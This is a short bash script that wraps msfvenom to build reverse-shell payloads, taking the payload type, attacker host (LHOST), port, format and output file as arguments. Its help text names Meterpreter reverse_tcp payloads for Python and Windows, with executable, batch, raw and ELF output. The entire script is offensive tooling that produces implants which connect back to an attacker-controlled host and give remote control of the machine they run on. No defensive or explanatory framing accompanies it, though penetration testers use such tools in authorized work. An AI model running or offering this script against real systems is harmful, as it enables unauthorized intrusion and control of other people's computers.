#!/bin/bash
# Dependencies: msfvenom
# Inputs: PAYLOAD, LHOST, LPORT, FORMAT, OUTPUT_FILE
# Help: Example Payload - python/meterpreter/reverse_tcp windows/meterpreter/reverse_tcp  Format options: exe, bat, raw, elf

PAYLOAD="$1"
LHOST="$2"
LPORT="$3"
FORMAT="$4"
OUTPUT_FILE="$5"


msfvenom -p $PAYLOAD LHOST=$LHOST LPORT=$LPORT -f $FORMAT -o $OUTPUT_FILE
